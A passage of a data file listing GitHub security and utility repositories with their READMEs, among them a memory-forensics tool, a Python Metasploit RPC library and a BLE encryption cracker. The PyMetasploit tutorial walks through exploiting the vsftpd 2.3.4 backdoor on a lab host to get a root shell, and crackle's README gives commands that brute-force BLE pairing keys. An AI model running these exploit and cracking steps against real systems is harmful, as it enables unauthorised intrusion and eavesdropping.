build the SDRplay RSP plugin. You first need to install the SDR driver from http://www.sdrplay.com/\\n\\nExample of how to compile for x64 Windows\\n\\n export PATH=$PATH:\\\"/cygdrive/C/Program Files/Java/jdk<put_your_version_here>/bin\\\"\\n make all JAVA_HOME=C:/PROGRA~1/Java/jdk<put_your_version_here> CC=x86_64-w64-mingw32-gcc ARCHNAME=X64\\n\\nAnd replace `<put_your_version_here>` with your JDK version.\\n\\nIf running SDRplay Plugin, make sure the mir_sdr_api.dll and sdrplay_api.dll are in the library path (or in the same directory as the executable).\\nYou can find the dll in C:/Program Files/SDRplay/API/x86 or C:/Program Files/SDRplay/API/x64 depending on your architecture. \\n\\nIf you don't intend to use the RSP dongle, you can skip this step by editing the Makefile in the JavaGUI directory. Remove TSDRPlugin\\\\_SDRPlay from line 89, changing it from\\n\\n PLUGINS += TSDRPlugin_SDRPlay TSDRPlugin_ExtIO\\n\\nto\\n\\n PLUGINS += TSDRPlugin_ExtIO\\n\\n### Linux and OS X\\n\\nOn Linux and OS X, compiling the GUI will also compile the UHD driver, so you will need to have UHD and the corresponding boost libraries installed (UHD will install them automatically). If you don't want the UHD drivers, then you can skip their compilation by removing the line 91 for Linux and line 93 for OS X from the Makefile in the JavaGUI directory.\\n\\n\\nBuilding the libraries\\n------------\\n\\nAll project could be built both with Eclipse and make as well.\\n\\n### TempestSDR library\\n\\nEnter the folder and type\\n\\n make all\\n\\t\\nThis will produce the library which could be found in the bin subdir. The headers you need to interface with it are located in src/include.\\n\\n### Plugins\\n\\nGo into a plugin directory and type\\n\\n make all\\n\\t\\nThis should work unless there is something specific for the plugin itself. Look for a README in this case.\\n\\nFolder Structure\\n------------\\n\\nThe different folders contain the different subprojects. The TempestSDR folder contains the main C library. The project aims to be crossplatform with plugin support for SDR frontends in different folders.\\n\\nRequirements for Building\\n------------\\n\\nThe project is built with Eclipse with the CDT plugin (but this is not required). Currently it supports Windows, Linux and OS X. Some frontend plugins might not be crossplatform. You also need a Java Development Kit (JDK) installed.\\n\\n### Windows\\n\\nYou need to have MinGW installed and gcc and make commands need to be in your path. Also javac and javah also need to be in your path.\\n\\n### Linux\\n\\nTo be announced soon.\\n\\n\\n\"", "topics": ["tempest", "eavesdropping", "sdr"], "writeup": "", "ignoredescription": false, "id": 53, "full_name": "martinmarinov/TempestSDR", "url": "https://github.com/martinmarinov/TempestSDR", "topic_string": "tempest eavesdropping sdr"},
{"tags": [], "owner": "microsoft", "description": "AVML - Acquire Volatile Memory for Linux", "name": "avml", "topics_string": "", "language": "Rust", "readme": "\"# AVML (Acquire Volatile Memory for Linux)\\n\\n## Summary\\n\\n*A portable volatile memory acquisition tool for Linux.*\\n\\nAVML is an X86_64 userland volatile memory acquisition tool written in\\n[Rust](https://www.rust-lang.org/), intended to be deployed as a static binary.\\nAVML can be used to acquire memory without knowing the target OS distribution\\nor kernel a priori. No on-target compilation or fingerprinting is needed.\\n\\n## Build Status\\n\\n[![Build Status](https://dev.azure.com/ms/avml/_apis/build/status/microsoft.avml?branchName=master)](https://dev.azure.com/ms/avml/_build/latest?definitionId=157&branchName=master)\\n\\n## Features\\n* Save recorded images to external locations via Azure Blob Store or HTTP PUT\\n* Automatic Retry (in case of network connection issues) with exponential backoff for uploading to Azure Blob Store\\n* Optional page level compression using [Snappy](https://google.github.io/snappy/).\\n* Uses [LiME](https://github.com/504ensicsLabs/LiME/) output format (when not using compression).\\n\\n## Memory Sources\\n* /dev/crash\\n* /proc/kcore\\n* /dev/mem\\n\\nIf the memory source is not specified on the commandline, AVML will iterate over the memory sources to find a functional source.\\n\\n## Tested Distributions\\n* Ubuntu: 12.04, 14.04, 16.04, 18.04, 18.10, 19.04, 19.10\\n* Centos: 6.5, 6.6, 6.7, 6.8, 6.9, 6.10, 7.0, 7.1, 7.2, 7.3, 7.4, 7.5, 7.6\\n* RHEL: 6.7, 6.8, 6.9, 7.0, 7.2, 7.3, 7.4, 7.5, 8\\n* Debian: 8, 9\\n* Oracle Linux: 6.8, 6.9, 7.3, 7.4, 7.5, 7.6\\n\\n# Getting Started\\n\\n## Capturing a compressed memory image\\n\\nOn the target host:\\n\\n```\\navml --compress output.lime\\n```\\n\\n## Capturing a memory image & uploading to Azure Blob Store\\n\\nOn a secure host with `az cli` credentials, generate a [SAS URL](https://docs.microsoft.com/en-us/azure/storage/common/storage-sas-overview).\\n```\\nEXPIRY=$(date -d '1 day' '+%Y-%m-%dT%H:%MZ') \\nSAS_URL=$(az storage blob generate-sas --account-name ACCOUNT --container CONTAINER test.lime --full-uri --permissions c --output tsv --expiry ${EXPIRY})\\n```\\n\\nOn the target host, execute avml with the generated SAS token.\\n```\\navml --sas_url ${SAS_URL} --delete output.lime\\n```\\n\\n## Capturing a memory image of an Azure VM using VM Extensions\\n\\nOn a secure host with `az cli` credentials, do the following:\\n\\n1. Generate a SAS URL (see above)\\n2. Create `config.json` containing the following information:\\n```\\n{\\n \\\"commandToExecute\\\": \\\"./avml --compress --sas_url <GENERATED_SAS_URL> --delete\\\",\\n \\\"fileUris\\\": [\\\"https://FULL.URL.TO.AVML.example.com/avml\\\"]\\n}\\n```\\n3. Execute the [customScript](https://docs.microsoft.com/en-us/azure/virtual-machines/extensions/custom-script-linux) extension with the specified `config.json`\\n```\\naz vm extension set -g RESOURCE_GROUP --vm-name VM_NAME --publisher Microsoft.Azure.Extensions -n customScript --settings config.json\\n```\\n\\n## To upload to AWS S3 or GCP Cloud Storage\\nOn a secure host, generate a [S3 pre-signed URL](https://docs.aws.amazon.com/cli/latest/reference/s3/presign.html) or generate a [GCP pre-signed URL](https://cloud.google.com/storage/docs/gsutil/commands/signurl).\\n\\nOn the target host, execute avml with the generated pre-signed URL.\\n```\\navml --put ${URL} --delete output.lime\\n```\\n\\n## To decompress an AVML-compressed image\\n```\\navml-convert ./compressed.lime ./uncompressed.lime\\n```\\n\\n## To compress an uncompressed LiME image\\n```\\navml-convert --format lime_compressed ./uncompressed.lime ./compressed.lime\\n```\\n\\n# Usage\\n\\n```\\navml [FLAGS] [OPTIONS] <filename>\\n\\nFLAGS:\\n --compress compress pages via snappy\\n --delete delete upon successful upload\\n -h, --help Prints help information\\n -V, --version Prints version information\\n\\nOPTIONS:\\n --sas_block_size <sas_block_size> specify maximum block size in MiB\\n --sas_url <sas_url> Upload via Azure Blob Store upon acquisition\\n --source <source> specify input source [possible values: /proc/kcore, /dev/crash, /dev/mem]\\n --url <url> Upload via HTTP PUT upon acquisition.\\n\\nARGS:\\n <filename> name of the file to write to on local system\\n```\\n\\n# Building on Ubuntu\\n\\n # Install MUSL\\n sudo apt-get install musl-dev musl-tools musl\\n\\n # Install Rust via rustup\\n curl https://sh.rustup.rs -sSf | sh -s -- -y\\n\\n # Add the MUSL target for Rust\\n rustup target add x86_64-unknown-linux-musl\\n\\n # Build\\n cargo build --release --target x86_64-unknown-linux-musl\\n\\n # Build without upload functionality\\n cargo build --release --target x86_64-unknown-linux-musl --no-default-features\\n\\n# Testing on Azure\\n\\nThe testing scripts will create, use, and cleanup a number of resource groups, virtual machines, and a storage account.\\n\\n1. Install [az cli](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)\\n2. Login to your Azure subscription using: `az login`\\n3. Build avml (see above)\\n4. ./test/run.sh\\n\\n# Contributing\\n\\nThis project welcomes contributions and suggestions. Most contributions require you to\\nagree to a Contributor License Agreement (CLA) declaring that you have the right to,\\nand actually do, grant us the rights to use your contribution. For details, visit\\nhttps://cla.microsoft.com.\\n\\nWhen you submit a pull request, a CLA-bot will automatically determine whether you need\\nto provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the\\ninstructions provided by the bot. You will only need to do this once across all repositories using our CLA.\\n\\nThis project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).\\nFor more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/)\\nor contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.\\n\\n# Reporting Security Issues\\n\\nSecurity issues and bugs should be reported privately, via email, to the Microsoft Security\\nResponse Center (MSRC) at [secure@microsoft.com](mailto:secure@microsoft.com). You should\\nreceive a response within 24 hours. If for some reason you do not, please follow up via\\nemail to ensure we received your original message. Further information, including the\\n[MSRC PGP](https://technet.microsoft.com/en-us/security/dn606155) key, can be found in\\nthe [Security TechCenter](https://technet.microsoft.com/en-us/security/default).\\n\"", "topics": ["linux", "security", "defensive", "memory-forensics"], "writeup": "AVML is an X86_64 userland volatile memory acquisition tool written in Rust, intended to be deployed as a static binary. AVML can be used to acquire memory without knowing the target OS distribution or kernel a priori. No on-target compilation or fingerprinting is needed.\n", "ignoredescription": true, "id": 54, "full_name": "microsoft/avml", "url": "https://github.com/microsoft/avml", "topic_string": "linux security defensive memory-forensics"},
{"tags": [], "owner": "Mikaayenson", "description": "A full-fledged msfrpc library for Metasploit framework.", "name": "pymetasploit", "topics_string": "", "language": "Python", "readme": "\"PyMetasploit - a full-fledged msfrpc library for Python\\n-------------------------------------------------------\\n\\nPyMetasploit is a full-fledged `msfrpc` library for Python. It is meant to interact with the msfrpcd daemon that comes\\nwith the latest versions of Metasploit. It does NOT interact with the console-based scripts that Metasploit provides\\nsuch as msfconsole, msfvenom, etc. Therefore, before you can begin to use this library, you'll need to initialize\\n`msfrpcd` and optionally (highly recommended) PostgreSQL.\\n\\n# Requirements\\n\\nBefore we begin, you'll need to install the following components:\\n\\n* **Metasploit:** https://github.com/rapid7/metasploit-framework\\n* **PostgreSQL (Optional):** http://www.postgresql.org\\n\\nInstalling PostgreSQL is highly recommended as it will improve response times when querying `msfrpcd` (Metasploit RPC\\ndaemon) for module information.\\n\\n# Tutorial\\n\\n## Starting `msfrpcd`\\n\\n`msfrpcd` accepts the following arguments:\\n\\n```bash\\n$ ./msfrpcd -h\\n\\n Usage: msfrpcd <options>\\n\\n OPTIONS:\\n\\n -P <opt> Specify the password to access msfrpcd\\n -S Disable SSL on the RPC socket\\n -U <opt> Specify the username to access msfrpcd\\n -a <opt> Bind to this IP address\\n -f Run the daemon in the foreground\\n -h Help banner\\n -n Disable database\\n -p <opt> Bind to this port instead of 55553\\n -u <opt> URI for Web server\\n```\\n\\nThe only parameter that is required to launch `msfrpcd` is the `-P` (password) parameter. This specifies the password\\nthat will be used to authenticate users to the daemon. As of this writing, `msfrpcd` only supports one username/password\\ncombination. However, the same user can log into the daemon multiple times. Unless specified otherwise, the `msfrpcd`\\ndaemon listens on port 55553 on all interfaces (`0.0.0.0:55553`).\\n\\nFor the purposes of this tutorial let's start the `msfrpcd` daemon with a minimal configuration:\\n\\n```bash\\n$ ./msfrpcd -P mypassword -n -f -a 127.0.0.1\\n[*] MSGRPC starting on 0.0.0.0:55553 (SSL):Msg...\\n[*] MSGRPC ready at 2014-04-19 23:49:39 -0400.\\n```\\n\\nThe `-f` parameter tells `msfrpcd` to remain in the foreground and the `-n` parameter disables database support.\\nFinally, the `-a` parameter tells `msfrcpd` to listen for requests only on the local loopback interface (`127.0.0.1`).\\n\\n## `MsfRpcClient` - Brief Overview\\n\\n### Connecting to `msfrpcd`\\n\\nLet's get started interacting with the Metasploit framework from python:\\n\\n```python\\n>>> from metasploit.msfrpc import MsfRpcClient\\n>>> client = MsfRpcClient('mypassword')\\n```\\n\\nThe `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Let's take a\\nlook at its underbelly:\\n\\n```python\\n>>> [m for m in dir(client) if not m.startswith('_')]\\n['auth', 'authenticated', 'call', 'client', 'consoles', 'core', 'db', 'jobs', 'login', 'logout', 'modules', 'plugins',\\n'port', 'server', 'sessionid', 'sessions', 'ssl', 'uri']\\n>>>\\n```\\n\\nLike the metasploit framework, `MsfRpcClient` is segmented into different management modules:\\n\\n* **`auth`**: manages the authentication of clients for the `msfrpcd` daemon.\\n* **`consoles`**: manages interaction with consoles/shells created by Metasploit modules.\\n* **`core`**: manages the Metasploit framework core.\\n* **`db`**: manages the backend database connectivity for `msfrpcd`.\\n* **`modules`**: manages the interaction and configuration of Metasploit modules (i.e. exploits, auxiliaries, etc.)\\n* **`plugins`**: manages the plugins associated with the Metasploit core.\\n* **`sessions`**: manages the interaction with Metasploit meterpreter sessions.\\n\\n### Running an Exploit\\n\\nJust like the Metasploit console, you can retrieve a list of all the modules that are available. Let's take a look at\\nwhat exploits are currently loaded:\\n\\n```python\\n>>> client.modules.exploits\\n['windows/wins/ms04_045_wins', 'windows/winrm/winrm_script_exec', 'windows/vpn/safenet_ike_11',\\n'windows/vnc/winvnc_http_get', 'windows/vnc/ultravnc_viewer_bof', 'windows/vnc/ultravnc_client', ...\\n'aix/rpc_ttdbserverd_realpath', 'aix/rpc_cmsd_opcode21']\\n>>>\\n```\\n\\nWe can also retrieve a list of `auxiliary`, `encoders`, `nops`, `payloads`, and `post` modules using the same syntax:\\n\\n```python\\n>>> client.modules.auxiliary\\n...\\n>>> client.modules.encoders\\n...\\n>>> client.modules.nops\\n...\\n>>> client.modules.payloads\\n...\\n>>> client.modules.post\\n...\\n```\\n\\nNow let's interact with one of the `exploit` modules:\\n\\n```python\\n>>> exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')\\n>>>\\n```\\n\\nIf all is well at this point, you will be able to query the module for various pieces of information such as author,\\ndescription, required run-time options, etc. Let's take a look:\\n\\n```python\\n>>> print exploit.description\\n\\n This module exploits a malicious backdoor that was added to the\\tVSFTPD download\\n archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between\\n June 30th 2011 and July 1st 2011 according to the most recent information\\n available. This backdoor was removed on July 3rd 2011.\\n\\n>>> exploit.authors\\n['hdm <hdm@metasploit.com>', 'MC <mc@metasploit.com>']\\n>>> exploit.options\\n['TCP::send_delay', 'ConnectTimeout', 'SSLVersion', 'VERBOSE', 'SSLCipher', 'CPORT', 'SSLVerifyMode', 'SSL', 'WfsDelay',\\n'CHOST', 'ContextInformationFile', 'WORKSPACE', 'EnableContextEncoding', 'TCP::max_send_size', 'Proxies',\\n'DisablePayloadHandler', 'RPORT', 'RHOST']\\n>>> exploit.required # Required options\\n['ConnectTimeout', 'RPORT', 'RHOST']\\n```\\n\\nThat's all fine and dandy but you're probably really itching to pop a box with this library right now, amiright!? Let's\\ndo it! Let's use a [Metasploitable 2](http://sourceforge.net/projects/metasploitable/) instance running on a VMWare\\nmachine as our target. Luckily it's running our favorite version of vsFTPd - 2.3.4 - and we already have our exploit\\nmodule loaded in PyMetasploit. Our next step is to specify our target:\\n\\n```python\\n>>> exploit['RHOST'] = '172.16.14.145' # IP of our target host\\n>>>\\n```\\n\\nYou can also specify or retrieve other options as well, as long as they're listed in `exploit.options`, using the same\\nmethod as shown above. For example, let's get and set the `VERBOSE` option:\\n\\n```python\\n>>> exploit['VERBOSE']\\nFalse\\n>>> exploit['VERBOSE'] = True\\n>>> exploit['VERBOSE']\\nTrue\\n>>>\\n```\\n\\nAwesome! So now we're ready to execute our exploit. All we need to do is select a payload:\\n\\n```python\\n>>> exploit.payloads\\n['cmd/unix/interact']\\n>>>\\n```\\n\\nAt this point, this exploit only supports one payload (`cmd/unix/interact`). So let's pop a shell:\\n\\n```python\\n>>> exploit.execute(payload='cmd/unix/interact')\\n{'job_id': 1, 'uuid': '3whbuevf'}\\n>>>\\n```\\n\\nExcellent! It looks like our exploit ran successfully. How can we tell? The `job_id` key contains a number. If the\\nmodule failed to execute for any reason, `job_id` would be `None`. For long running modules, you may want to poll the\\njob list by checking `client.jobs.list`. Since this is a fairly quick exploit, the job list will most likely be empty\\nand if we managed to pop our box, we might see something nice in the sessions list:\\n\\n```python\\n>>> client.sessions.list\\n{1: {'info': '', 'username': 'ndouba', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact',\\n'uuid': '5orqnnyv', 'tunnel_local': '172.16.14.1:58429', 'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor',\\n'exploit_uuid': '3whbuevf', 'tunnel_peer': '172.16.14.145:6200', 'workspace': 'false', 'routes': '',\\n'target_host': '172.16.14.145', 'type': 'shell', 'session_host': '172.16.14.145', 'desc': 'Command shell'}}\\n>>>\\n```\\n\\nSuccess! We managed to pop the box! `client.sessions.list` shows us that we have a live session with the same `uuid` as\\nthe one we received when executing the module earlier (`exploit.execute()`). Let's interact with the shell:\\n\\n```python\\n>>> shell = client.sessions.session(1)\\n>>> shell.write('whoami\\\\n')\\n>>> print shell.read()\\nroot\\n>>> # Happy dance!\\n```\\n\\nThis is just a sample of how powerful PyMetasploit can be. Use your powers wisely, Grasshopper, because with great power\\ncomes great responsibility \\u2013 unless you are a banker.\\n\\n# Questions?\\n\\nEmail me at ndouba.at.gmail.com\\n\"", "topics": ["exploit", "rpc", "metasploit"], "writeup": "", "ignoredescription": false, "id": 55, "full_name": "Mikaayenson/pymetasploit", "url": "https://github.com/Mikaayenson/pymetasploit", "topic_string": "exploit rpc metasploit"},
{"tags": [], "owner": "mikeryan", "description": "Crack and decrypt BLE encryption", "name": "crackle", "topics_string": "", "language": "C", "readme": "\"![crackle](https://raw.github.com/mikeryan/crackle/logo/crackle.png \\\"crackle\\\")\\n\\ncrackle cracks BLE Encryption (AKA Bluetooth Smart).\\n\\ncrackle exploits a flaw in the BLE pairing process that allows an\\nattacker to guess or very quickly brute force the TK (Temporary Key).\\nWith the TK and other data collected from the pairing process, the STK\\n(Short Term Key) and later the LTK (Long Term Key) can be collected.\\n\\nWith the STK and LTK, all communications between the master and the\\nslave can be decrypted.\\n\\nBefore attempting to use crackle, review the [FAQ](FAQ.md) to determine\\nwhether it is the appropriate tool to use in your situation.\\n\\ncrackle was written by Mike Ryan <mikeryan@lacklustre.net>\\nSee web site for more info:\\n http://lacklustre.net/projects/crackle/\\n\\n![Build Status](https://travis-ci.org/mikeryan/crackle.svg?branch=master \\\"Build Status\\\")\\n\\nTable of Contents\\n=================\\n\\n - Modes of Operation\\n - Crack TK\\n - Decrypt with LTK\\n - Running crackle\\n - Sample Files\\n - Frequently Asked Questions\\n - See Also\\n - Thanks\\n\\n\\nModes of Operation\\n==================\\n\\ncrackle has two major modes of operation: Crack TK and Decrypt with LTK.\\n\\nCrack TK\\n--------\\n\\nThis is the default mode used when providing crackle with an input file\\nusing ```-i```.\\n\\nIn Crack TK mode, crackle brute forces the TK used during a BLE pairing\\nevent. crackle exploits the fact that the TK in Just Works(tm) and\\n6-digit PIN is a value in the range [0,999999] padded to 128 bits.\\n\\ncrackle employs several methods to perform this brute force: a very fast\\nmethod if all pairing packets are present in the input file, and a slow\\nmethod if a minimum set of packets is present.\\n\\nTo use this mode, launch crackle with an input PCAP or PcapNG file\\ncontaining one or more connections with a BLE pairing conversation.\\ncrackle will analyze all connections, determine whether it is possible\\nto crack a given connection, and automatically choose the best strategy\\nto crack each one.\\n\\nIf the TK successfully cracks, crackle will derive the remaining keys\\nused to encrypt the rest of the connection and will decrypt any\\nencrypted packets that follow. If the LTK is exchanged (typically the\\nfirst thing done after encryption is established) crackle will output\\nthis value to stdout. The LTK can be used to decrypt any future\\ncommunications between the two endpoints.\\n\\nProvide crackle with an output file using ```-o``` to create a new PCAP\\nfile containing the decrypted data (in addition to the already\\nunencrypted data).\\n\\nExample usage:\\n\\n $ crackle -i input.pcap -o decrypted.pcap\\n\\n\\nDecrypt with LTK\\n----------------\\n\\nIn Decrypt with LTK mode, crackle uses a user-supplied LTK to decrypt\\ncommunications between a master and slave. This mode is identical to the\\ndecryption portion of Crack TK mode.\\n\\nExample usage:\\n\\n $ crackle -i encrypted.pcap -o decrypted.pcap -l 81b06facd90fe7a6e9bbd9cee59736a7\\n\\n\\nRunning Crackle\\n===============\\n\\nCrack TK Mode\\n-------------\\n\\nIn Crack TK mode, crackle requires a PCAP file that contains a BLE\\npairing event. The best way to generate such a file is to use an\\nUbertooth to capture a pairing event between a master and a slave.\\n\\nTo check if your PCAP file contains all the necessary packets, run\\ncrackle with the -i option:\\n\\n crackle -i <file.pcap>\\n\\ncrackle will analyze each connection in the input file and output the\\nresults of its analysis to stdout. If you have all the components of a\\npairing conversation, the output will look like this:\\n\\n Analyzing connection 0:\\n xx:xx:xx:xx:xx:xx (public) -> yy:yy:yy:yy:yy:yy (public)\\n Found 13 encrypted packets\\n\\n Cracking with strategy 0, 20 bits of entropy\\n\\n !!!\\n TK found: 412741\\n !!!\\n\\n Decrypted 12 packets\\n LTK found: 81b06facd90fe7a6e9bbd9cee59736a7\\n\\n Specify an output file with -o to decrypt packets!\\n\\nTo decrypt all packets, add the -o option:\\n\\n crackle -i <file.pcap> -o <output.pcap>\\n\\nThe output file will contain decrypted versions of all the encrypted\\npackets from the original PCAP, as well as all the unencrypted packets.\\nNote that CRCs are not recalculated, so the CRCs of decrypted packets\\nwill be incorrect.\\n\\nDecrypt with LTK\\n----------------\\n\\nIn Decrypt with LTK mode, crackle requires a PCAP file that contains at\\na minimum LL_ENC_REQ and LL_ENC_RSP packets and the LTK used to encrypt\\nthe communications.\\n\\nThe format for LTK is a 128 bit hexadecimal number with no spaces or\\nseparators, most-significant octet to least-significant octet. Example:\\n\\n -l 81b06facd90fe7a6e9bbd9cee59736a7\\n\\nTo check if your PCAP file contains all the necessary packets, run\\ncrackle with -i and -l:\\n\\n crackle -i <file.pcap> -l <ltk>\\n\\nIf you have both of the required packets, the program should produce\\noutput similar to this:\\n\\n Analyzing connection 0:\\n xx:xx:xx:xx:xx:xx (public) -> yy:yy:yy:yy:yy:yy (public)\\n Found 9 encrypted packets\\n Decrypted 6 packets\\n\\n Specify an output file with -o to decrypt packets!\\n\\nTo decrypt all packets, add the -o option:\\n\\n crackle -i <file.pcap> -o <out.pcap> -l <ltk>\\n\\nThe output file will be produced similarly to the output file described\\nabove.\\n\\n\\nSample Files\\n============\\n\\nThe test files included in the ```tests``` directory serve as\\ninteresting input for playing with crackle. Review the README files\\nincluded in each test's subdirectory.\\n\\nGrab some sample files for cracking with crackle. Refer to the README\\ninside the tarball for more information:\\n\\nhttps://lacklustre.net/bluetooth/crackle-sample.tgz\\n\\n\\nFrequently Asked Questions\\n==========================\\n\\nWe have compiled a list of [Frequently Asked Questions](FAQ.md).\\n\\n\\nSee Also\\n========\\n\\n - Ubertooth: http://ubertooth.sourceforge.net/\\n - libbtbb: http://libbtbb.sourceforge.net/\\n - #ubertooth on irc.freenode.net\\n\\n\\nThanks\\n======\\n\\nMajor thanks go to Mike Ossmann and Dominic Spill from the Ubertooth\\nproject. None of this would be possible without them.\\n\\nBig time thanks go to Mike Kershaw/dragorn of Kismet for help creating\\nand working with PCAP files.\\n\\nThanks go to the rest of #ubertooth on irc.freenode.net.\\n\"", "topics": ["bluetooth"], "writeup": "crackle cracks BLE Encryption (AKA Bluetooth Smart). crackle exploits a flaw in the BLE pairing process that allows an attacker to guess or very quickly brute force the TK (Temporary Key). With the TK and other data collected from the pairing process, the STK (Short Term Key) and later the LTK (Long Term Key) can be collected. With the STK and LTK, all communications between the master and the slave can be decrypted.\n", "ignoredescription": false, "id": 56, "full_name": "mikeryan/crackle", "url": "https://github.com/mikeryan/crackle", "topic_string": "bluetooth"},
{"tags": [], "owner": "mildsunrise", "description": "\ud83d\udd75\ufe0f Tool to reverse-engineer Protocol Buffers with unknown definition", "name": "protobuf-inspector", "topics_string": "", "language": "Python", "readme": "\"# protobuf-inspector\\n\\nSimple program that can parse [Google Protobuf][] encoded blobs\\n(version 2 or 3) without knowing their accompanying definition.\\nIt will print a nice, colored representation of their contents. Example:\\n\\n![Main screenshot](https://i.imgur.com/Vw403MI.png)\\n\\nAs you can see, the field names are obviously lost, together with\\nsome high-level details such as:\\n\\n - whether a varint uses [zig-zag encoding][] or not (will assume no zig-zag by default)\\n - whether a 32-bit/64-bit value is an integer or float (both shown by default)\\n - signedness (auto-detect by default)\\n\\nBut protobuf-inspector is able to correctly guess the message structure\\nmost of the time. When it finds embedded binary data on a field, it'll\\nfirst try to parse it as a message. If that fails, it'll display the data\\nas a string or hexdump. It can make mistakes, especially with small chunks.\\n\\nIt shows the fields just in the order they are encoded in the\\nwire, so it can be useful for those wanting to get familiar with\\nthe [wire format][] or parser developers, in addition to reverse-engineering.\\n\\n## Usage\\n\\nNo dependencies required. Just run `main.py` and feed the protobuf blob\\non stdin:\\n\\n ./main.py < my-protobuf-blob\\n\\nAfter reading the first (blind) analysis of the blob, you typically start defining\\nsome of the fields so protobuf-inspector can better parse your blobs, until you get\\nto a point where you have a full protobuf definition and the parser no longer has\\nto guess anything.\\n\\n[Read about defining fields here.](CONFIG.md)\\n\\n## Parsing errors\\n\\nIf a parsing error is found, parsing will stop *within that field*, but\\nwill go on unaffected at the outside of the hierarchy. The stack trace will\\nbe printed where the field contents would go, along with a hexdump indicating where\\nparsing was stopped in that chunk, if applicable.\\n\\nSo, if you specified a `uint32` and a larger varint is found, you'd get something like:\\n\\n![Error on invalid varint](https://i.imgur.com/DWG9MGX.png)\\n\\nIf you specified that some field contained an embedded message, but invalid data was\\nfound there, you'd get:\\n\\n![Error on invalid message](https://i.imgur.com/URaWqXz.png)\\n\\nPlease note that `main.py` will exit with non-zero status if one or more parsing\\nerrors occurred.\\n\\n## Tricks\\n\\nThere are some tricks you can use to save time when approaching a blob:\\n\\n 1. If you are positive that a varint does *not* use zig-zag encoding, but are still\\n not sure of the signedness, leave it as `varint`. If it does use zig-zag encoding,\\n use `sint64` unless you are sure it's 32-bit and not 64-bit.\\n\\n 2. If a chunk is wrongly being recognized as a `packed chunk` or an embedded message,\\n or if you see something weird with the parsed message and want to see the raw bytes,\\n specify a type of `bytes`. Conversely, if for some reason it's not being detected\\n as an embedded message and it should, force it to `message` to see the reason.\\n\\n 3. If you want to extract a chunk's raw data to a file to analyze it better, specify a\\n type of `dump` and protobuf-inspector will create `dump.0`, `dump.1`,\\n etc. every time it finds a matching blob.\\n\\n 4. protobuf-inspector parses the blob as a message of type `root`, but that's just a\\n default. If you have lots of message types defined, you can pass a type name as\\n optional argument, and protobuf-inspector will use that instead of `root`:\\n \\n ./main.py request < my-protobuf-blob\\n\\n\\n\\n[Google Protobuf]: https://developers.google.com/protocol-buffers\\n[Wire format]: https://developers.google.com/protocol-buffers/docs/encoding\\n[Zig-zag encoding]: https://developers.google.com/protocol-buffers/docs/encoding#signed-integers\\n\"", "topics": ["protobuf", "serialization", "cli", "reverse-engineering"], "writeup": "", "ignoredescription": false, "id": 57, "full_name": "mildsunrise/protobuf-inspector", "url": "https://github.com/mildsunrise/protobuf-inspector", "topic_string": "protobuf serialization cli reverse-engineering"},
{"tags": [], "owner": "mne-tools", "description": "MNE : Magnetoencephalography (MEG) and Electroencephalography (EEG) in Python", "name": "mne-python", "topics_string": "", "language": "Python", "readme": "\".. -*- mode: rst -*-\\n\\n|Travis|_ |Azure|_ |Circle|_ |Codecov|_ |PyPI|_ |conda-forge|_ |Zenodo|_\\n\\n|MNE|_\\n\\n.. |Travis| image:: https://api.travis-ci.org/mne-tools/mne-python.svg?branch=master\\n.. _Travis: https://travis-ci.org/mne-tools/mne-python/branches\\n\\n.. |Azure| image:: https://dev.azure.com/mne-tools/mne-python/_apis/build/status/mne-tools.mne-python?branchName=master\\n.. _Azure: https://dev.azure.com/mne-tools/mne-python/_build/latest?definitionId=1&branchName=master\\n\\n.. |Circle| image:: https://circleci.com/gh/mne-tools/mne-python.svg?style=shield\\n.. _Circle: https://circleci.com/gh/mne-tools/mne-python\\n\\n.. |Codecov| image:: https://codecov.io/gh/mne-tools/mne-python/branch/master/graph/badge.svg\\n.. _Codecov: https://codecov.io/gh/mne-tools/mne-python\\n\\n.. |PyPI| image:: https://img.shields.io/pypi/dm/mne.svg?label=PyPI%20downloads\\n.. _PyPI: https://pypi.org/project/mne/\\n\\n.. |conda-forge| image:: https://img.shields.io/conda/dn/conda-forge/mne.svg?label=Conda%20downloads\\n.. _conda-forge: https://anaconda.org/conda-forge/mne\\n\\n.. |Zenodo| image:: https://zenodo.org/badge/DOI/10.5281/zenodo.592483.svg\\n.. _Zenodo: https://doi.org/10.5281/zenodo.592483\\n\\n.. |MNE| image:: https://mne.tools/stable/_static/mne_logo.svg\\n.. _MNE: https://mne.tools/dev/\\n\\nMNE-Python\\n==========\\n\\n`MNE-Python software`_ is an open-source Python package for exploring,\\nvisualizing, and analyzing human neurophysiological data such as MEG, EEG, sEEG,\\nECoG, and more. It includes modules for data input/output, preprocessing,\\nvisualization, source estimation, time-frequency analysis, connectivity analysis,\\nmachine learning, and statistics.\\n\\n\\nDocumentation\\n^^^^^^^^^^^^^\\n\\n`MNE documentation`_ for MNE-Python is available online.\\n\\n\\nInstalling MNE-Python\\n^^^^^^^^^^^^^^^^^^^^^\\n\\nTo install the latest stable version of MNE-Python, you can use pip_ in a terminal:\\n\\n.. code-block:: bash\\n\\n pip install -U mne\\n\\n- MNE-Python 0.17 was the last release to support Python 2.7\\n- MNE-Python 0.18 requires Python 3.5 or higher\\n- MNE-Python 0.21 requires Python 3.6 or higher\\n\\nFor more complete instructions and more advanced installation methods (e.g. for\\nthe latest development version), see the `installation guide`_.\\n\\n\\nGet the latest code\\n^^^^^^^^^^^^^^^^^^^\\n\\nTo install the latest version of the code using pip_ open a terminal and type:\\n\\n.. code-block:: bash\\n\\n pip install -U https://github.com/mne-tools/mne-python/archive/master.zip\\n\\nTo get the latest code using `git <https://git-scm.com/>`__, open a terminal and type:\\n\\n.. code-block:: bash\\n\\n git clone git://github.com/mne-tools/mne-python.git\\n\\nAlternatively, you can also download a\\n`zip file of the latest development version <https://github.com/mne-tools/mne-python/archive/master.zip>`__.\\n\\n\\nDependencies\\n^^^^^^^^^^^^\\n\\nThe minimum required dependencies to run MNE-Python are:\\n\\n- Python >= 3.6\\n- NumPy >= 1.13.3\\n- SciPy >= 